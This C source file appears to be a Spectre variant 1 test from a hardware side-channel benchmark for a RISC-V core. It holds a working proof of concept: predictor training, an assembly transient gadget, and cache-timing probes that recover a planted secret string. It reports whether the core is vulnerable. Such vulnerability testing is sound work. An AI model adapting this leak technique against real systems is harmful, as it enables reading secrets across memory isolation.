/**
 * spectre-v1: Bounds-Check Bypass (Spectre Variant 1) multi-byte leak PoC.
 *
 * Follows the canonical Spectre-v1 PHT PoC structure (readMemoryByte iterated
 * over the secret string) adapted to the target core:
 *  - multi-byte: malicious_x walks the secret string, recovering one byte per
 *    position via the cache-timing channel (array2[array1[x]*stride]).
 *  - branchless training mix: 30 calls per try, every 6th is the malicious x,
 *    selected without jumps so the predictor is not tipped off; the bounds
 *    line is flushed each training step to keep the resolution window wide.
 *  - hand-written asm transient gadget; secret source re-warmed after eviction
 *    so the transient probe load issues before the retirement-time flush.
 *  - mixed-order probing defeats the stride prefetcher; probe stride 4160
 *    spreads entries over all L1D/L2 sets.
 *  - positive control + per-byte null arm + Bonferroni z-test; a byte counts as
 *    leaked only when its index wins significantly over the null base rate.
 */
#include "bench.h"

#define ARRAY_SIZE 16
#ifndef SECURITY_ATTACK_ROUNDS
#define SECURITY_ATTACK_ROUNDS 60
#endif
#ifndef SECURITY_SECRET_LEN
#define SECURITY_SECRET_LEN 8
#endif
#define TRAIN_ROUNDS 30

static struct {
  uint8_t allowed[ARRAY_SIZE];
  uint8_t secret[64];
} victim_data __attribute__((aligned(SC_LINE_BYTES)));

static struct {
  volatile unsigned size;
  uint8_t pad[SC_LINE_BYTES - sizeof(unsigned)];
} bounds __attribute__((aligned(SC_LINE_BYTES)));

static uint8_t probe_array[SC_PROBE_ENTRIES * SC_PROBE_STRIDE]
    __attribute__((aligned(SC_PAGE_BYTES)));

static const char secret_str[] = "The Magic Words are Squeamish Ossifrage.";

/* Transient gadget: cold bounds load -> predicted-in-bounds branch ->
 * hot secret byte -> probe[secret*stride]. */
__attribute__((noinline))
static void victim_function(size_t x) {
  register size_t xx asm("a0") = x;
  register volatile unsigned *bp asm("a1") = &bounds.size;
  register uint8_t *al asm("a2") = victim_data.allowed;
  register uint8_t *pr asm("a3") = probe_array;
  asm volatile(
      "lw   t0, 0(%[bp])\n"
      "bgeu %[x], t0, 1f\n"
      "add  t1, %[al], %[x]\n"
      "lbu  t1, 0(t1)\n"
      "li   t2, %[stride]\n"
      "mul  t1, t1, t2\n"
      "add  t1, %[pr], t1\n"
      "lbu  t2, 0(t1)\n"
      "1:\n"
      : [x] "+r"(xx)
      : [bp] "r"(bp), [al] "r"(al), [pr] "r"(pr),
        [stride] "i"(SC_PROBE_STRIDE)
      : "t0", "t1", "t2", "memory");
}

/* Branchless training mix (canonical PoC): mostly in-bounds training_x, every
 * 6th call the malicious x, selected without branches.  Flush bounds each step
 * so the bounds load stays cold and the transient window stays wide. */
static void train_mix(size_t malicious_x, const sc_geom_t *g) {
  (void)g;
  for (int j = TRAIN_ROUNDS - 1; j >= 0; j--) {
    size_t training_x = (size_t)(j % ARRAY_SIZE);
    size_t mask = (size_t)(((j % 6) - 1) & ~0xFFFF);
    mask = (mask | (mask >> 16));
    size_t x = training_x ^ (mask & (malicious_x ^ training_x));
    victim_function(x);
  }
}

static void round_prep(const sc_geom_t *g) {
  sc_evict_capacity(g);
  volatile uint8_t sink = 0;
  for (int i = 0; i < ARRAY_SIZE; i++)
    sink += victim_data.allowed[i];
  for (int i = 0; i < SECURITY_SECRET_LEN; i++)
    sink += victim_data.secret[i];
  (void)sink;
  sc_fence();
}

/* Recover one byte at malicious_x.  Returns the winning index; fills score. */
static int read_byte(size_t malicious_x, const sc_geom_t *g, uint32_t tries,
                     uint32_t *score) {
  sc_score_t atk;
  sc_score_reset(&atk);
  for (uint32_t t = 0; t < tries; t++) {
    train_mix(malicious_x, g);
    round_prep(g);
    victim_function(malicious_x);
    sc_fence();
    sc_probe_array(probe_array, g, &atk, 0x51de + t);
    atk.rounds++;
  }
  int best = sc_argmax(&atk);
  *score = atk.hits[best];
  return best;
}

int main(void) {
  if (sc_time_selfcheck("spectre-v1") != 0)
    return 1;
  sc_geom_t g;
  sc_calibrate(&g);
  if (sc_evict_selftest(&g) != 0) {
    printf("SCRESULT spectre-v1 ERROR reason=evict\n");
    return 1;
  }

  for (int i = 0; i < ARRAY_SIZE; i++)
    victim_data.allowed[i] = (uint8_t)i;
  for (int i = 0; i < SECURITY_SECRET_LEN; i++)
    victim_data.secret[i] = (uint8_t)secret_str[i];
  bounds.size = ARRAY_SIZE;
  for (int i = 0; i < SC_PROBE_ENTRIES; i++)
    probe_array[(uintptr_t)i * SC_PROBE_STRIDE] = 0;
  sc_fence();

  size_t base_x = (size_t)(victim_data.secret - victim_data.allowed);
  uint32_t R = SECURITY_ATTACK_ROUNDS;

  /* Positive control: architectural touch of a probe line must register. */
  sc_score_t pos;
  sc_score_reset(&pos);
  for (uint32_t r = 0; r < R; r++) {
    sc_evict_capacity(&g);
    sc_fence();
    volatile uint8_t tmp = probe_array[(uintptr_t)0x42 * SC_PROBE_STRIDE];
    (void)tmp;
    sc_fence();
    sc_probe_array(probe_array, &g, &pos, 0xa11ce + r);
    pos.rounds++;
  }
  int pos_ok = pos.hits[0x42] >= R / 2;

  /* Multi-byte leak: walk the secret string, recover each byte. */
  uint8_t recovered[SECURITY_SECRET_LEN];
  uint32_t scores[SECURITY_SECRET_LEN];
  int matched = 0;
  printf("[spectre-v1] leaking %d bytes (base_x=%u):\n",
         SECURITY_SECRET_LEN, (unsigned)base_x);
  for (int i = 0; i < SECURITY_SECRET_LEN; i++) {
    int got = read_byte(base_x + (size_t)i, &g, R * 5, &scores[i]);
    recovered[i] = (uint8_t)got;
    int ok = (got == (uint8_t)secret_str[i]);
    matched += ok;
    printf("  [%2d] want=0x%02x '%c' got=0x%02x '%c' score=%u/%u %s\n",
           i, (uint8_t)secret_str[i],
           (secret_str[i] > 31 && secret_str[i] < 127) ? secret_str[i] : '?',
           got, (got > 31 && got < 127) ? got : '?',
           (unsigned)scores[i], (unsigned)(R * 5), ok ? "OK" : "miss");
  }

  /* Rigorous single-byte verdict with a null arm at the first secret byte. */
  int expect = (uint8_t)secret_str[0];
  sc_score_t atk, nul;
  sc_score_reset(&atk);
  sc_score_reset(&nul);
  for (uint32_t r = 0; r < R * 5; r++) {
    train_mix(base_x, &g);
    round_prep(&g);
    victim_function(base_x);
    sc_fence();
    sc_probe_array(probe_array, &g, &atk, 0x51de + r);
    atk.rounds++;
    train_mix(base_x, &g);
    round_prep(&g);
    /* null: same window, probe index forced to 0 via a benign secret byte */
    victim_data.secret[0] = 0;
    victim_function(base_x);
    victim_data.secret[0] = (uint8_t)secret_str[0];
    sc_fence();
    sc_probe_array(probe_array, &g, &nul, 0x9e37 + r);
    nul.rounds++;
  }
  sc_decision_t d = sc_decide(&atk, &nul, expect, pos_ok);
  sc_result("spectre-v1", &d, pos_ok, expect, R * 5, &g);

  int multibit_ok = pos_ok && matched >= (SECURITY_SECRET_LEN + 1) / 2;
  printf("SCRESULT spectre-v1-multibit %s pos=%d leaked=%d/%d rounds=%u\n",
         multibit_ok ? "VULNERABLE" : "NOT_VULNERABLE", pos_ok, matched,
         SECURITY_SECRET_LEN, (unsigned)R);
  printf("[spectre-v1] recovered %d/%d bytes: ", matched, SECURITY_SECRET_LEN);
  for (int i = 0; i < SECURITY_SECRET_LEN; i++)
    putchar((recovered[i] > 31 && recovered[i] < 127) ? recovered[i] : '?');
  putchar('\n');
  if (d.verdict == SC_VULNERABLE || multibit_ok)
    printf("[spectre-v1] VULNERABLE: multi-byte bounds-check bypass leak\n");
  else if (!pos_ok)
    printf("[spectre-v1] INCONCLUSIVE: positive control failed\n");
  else
    printf("[spectre-v1] NOT VULNERABLE or insufficient signal\n");
  return 0;
}